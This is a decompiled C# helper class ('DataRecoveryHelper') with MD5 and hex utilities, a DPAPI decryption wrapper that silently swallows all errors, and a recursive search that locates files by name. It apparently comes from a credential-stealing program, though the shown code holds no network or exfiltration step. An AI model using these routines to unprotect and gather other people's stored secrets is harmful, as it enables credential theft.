using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace NoiseMe.Drags.App.Models
{
	// Token: 0x02000085 RID: 133
	public static class DataRecoveryHelper
	{
		// Token: 0x06000480 RID: 1152 RVA: 0x000167C4 File Offset: 0x000149C4
		public static string GetMd5Hash(string source)
		{
			HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.ASCII.GetBytes(source);
			return DataRecoveryHelper.GetHexString(hashAlgorithm.ComputeHash(bytes));
		}

		// Token: 0x06000481 RID: 1153 RVA: 0x000167F0 File Offset: 0x000149F0
		private static string GetHexString(IList<byte> bt)
		{
			string text = string.Empty;
			for (int i = 0; i < bt.Count; i++)
			{
				byte b = bt[i];
				int num = (int)(b & 15);
				int num2 = b >> 4 & 15;
				if (num2 > 9)
				{
					text += ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num2.ToString(CultureInfo.InvariantCulture);
				}
				if (num > 9)
				{
					text += ((char)(num - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num.ToString(CultureInfo.InvariantCulture);
				}
				if (i + 1 != bt.Count && (i + 1) % 2 == 0)
				{
					text += "-";
				}
			}
			return text;
		}

		// Token: 0x06000482 RID: 1154 RVA: 0x000168BC File Offset: 0x00014ABC
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					hexString
				}));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x06000483 RID: 1155 RVA: 0x00004C80 File Offset: 0x00002E80
		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			return DataRecoveryHelper.DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy);
		}

		// Token: 0x06000484 RID: 1156 RVA: 0x00016930 File Offset: 0x00014B30
		public static string DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			string result;
			try
			{
				if (EncryptedData == null || EncryptedData.Length == 0)
				{
					result = string.Empty;
				}
				else
				{
					byte[] bytes = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
					result = Encoding.UTF8.GetString(bytes);
				}
			}
			catch (CryptographicException)
			{
				result = string.Empty;
			}
			catch (Exception)
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x06000485 RID: 1157 RVA: 0x00016994 File Offset: 0x00014B94
		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			if (files == null || files.Length == 0 || level > maxLevel)
			{
				return list;
			}
			foreach (string path in Directory.GetDirectories(baseDirectory))
			{
				try
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(path);
					FileInfo[] files2 = directoryInfo.GetFiles();
					bool flag = false;
					int num = 0;
					while (num < files2.Length && !flag)
					{
						int num2 = 0;
						while (num2 < files.Length && !flag)
						{
							string a = files[num2];
							FileInfo fileInfo = files2[num];
							if (a == fileInfo.Name)
							{
								flag = true;
								list.Add(fileInfo.FullName);
							}
							num2++;
						}
						num++;
					}
					foreach (string item in DataRecoveryHelper.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
					{
						if (!list.Contains(item))
						{
							list.Add(item);
						}
					}
				}
				catch
				{
				}
			}
			return list;
		}
	}
}
